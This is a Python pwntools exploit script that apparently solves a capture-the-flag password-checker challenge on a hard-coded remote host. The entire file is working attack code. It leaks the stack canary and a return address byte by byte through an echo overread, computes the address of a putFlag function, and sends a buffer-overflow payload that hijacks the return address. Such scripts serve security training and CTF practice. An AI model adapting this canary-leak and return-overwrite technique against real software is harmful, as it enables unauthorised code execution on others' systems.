#!/usr/bin/env python3
from pwn import *

HOST = "140.113.207.245"
PORT = 30174

WELCOME      = b"Here is another password checker, you got 5 chances to try\n"
ECHO_PREFIX  = b"Your password is "
ERROR_SUFFIX = b"Password is incorrect. Let's try again\n"
PUTFLAG_OFFSET = 0x20D

tries = 0


def start():
    return remote(HOST, PORT)


def recv_iteration(io):
    data = io.recvuntil(ERROR_SUFFIX)
    if not data.endswith(ERROR_SUFFIX):
        raise RuntimeError(f"unexpected response: {data!r}")
    if not data.startswith(ECHO_PREFIX):
        raise RuntimeError(f"unexpected prefix: {data!r}")
    return data[len(ECHO_PREFIX): -len(ERROR_SUFFIX)]


# ==========================================
# [Chance 1] Leak Canary
# ==========================================
def leak_canary(io):
    canary = b""
    payload = b"A" * 24
    global tries

    for _ in range(tries, 5):
        tries += 1
        payload += b"B" * len(canary)
        io.send(payload)
        body = recv_iteration(io)
        log.info(f"canary body len={len(body)}")

        if not body.startswith(payload):
            raise RuntimeError(f"canary leak mismatch: {body!r}")

        leak = body[len(payload):]
        if len(leak):
            canary += leak[:min(8 - len(canary), len(leak))]

        if len(canary) < 8:
            canary += b"\x00"
        if len(canary) == 8:
            break

    if len(canary) != 8:
        raise RuntimeError(f"canary size={len(canary)} != 8")
    return u64(canary)


# ==========================================
# [Chance 2] Leak Return Address
# ==========================================
def leak_return_address(io):
    mainret = b""
    payload = b"A" * 40 
    global tries

    for _ in range(tries, 5):
        tries += 1
        payload += b"B" * len(mainret)
        io.send(payload)
        body = recv_iteration(io)
        log.info(f"ret body len={len(body)}")

        if not body.startswith(payload):
            raise RuntimeError(f"return-address leak mismatch: {body!r}")

        leak = body[len(payload):]
        log.info(f"ret leak bytes={leak.hex()}")
        if len(leak):
            mainret += leak[:min(8 - len(mainret), len(leak))]
        if len(mainret) < 8:
            mainret += b"\x00"
        if len(mainret) == 8:
            break

    if len(mainret) != 8:
        raise RuntimeError(f"return address size={len(mainret)} != 8")
    return u64(mainret)


# ==========================================
# [Chance 3~5] finish rest times
# ==========================================
def send_payload_and_waste_tries(io, payload):
    global tries
    for _ in range(tries, 5):
        io.send(payload)
        io.recvuntil(ERROR_SUFFIX)


def exploit(io):
    io.recvuntil(WELCOME)

    # leak canary
    log.info("--- Leaking Canary ---")
    canary = leak_canary(io)
    log.success(f"Leaked Canary:         {canary:#018x}")

    # leak return address
    log.info("--- Leaking Return Address ---")
    retaddr = leak_return_address(io)
    log.success(f"Leaked Return Address: {retaddr:#018x}")

    putflag = retaddr - PUTFLAG_OFFSET
    log.success(f"Computed putFlag:      {putflag:#018x}")

    # final payload
    log.info("--- Sending exploit payload ---")
    final_payload = b"A" * 24 + p64(canary) + b"B" * 8 + p64(putflag) + b"\x00"
    log.info(f"final payload len={len(final_payload)}")
    send_payload_and_waste_tries(io, final_payload)

    io.shutdown("send")
    out = io.recvall(timeout=5)
    print("\n========== FLAG OUTPUT ==========")
    if out:
        print(out.decode(errors="replace"), end="")
    else:
        log.warning("No output received — check offset or connection.")


if __name__ == "__main__":
    context.log_level = "info"
    with start() as io:
        exploit(io)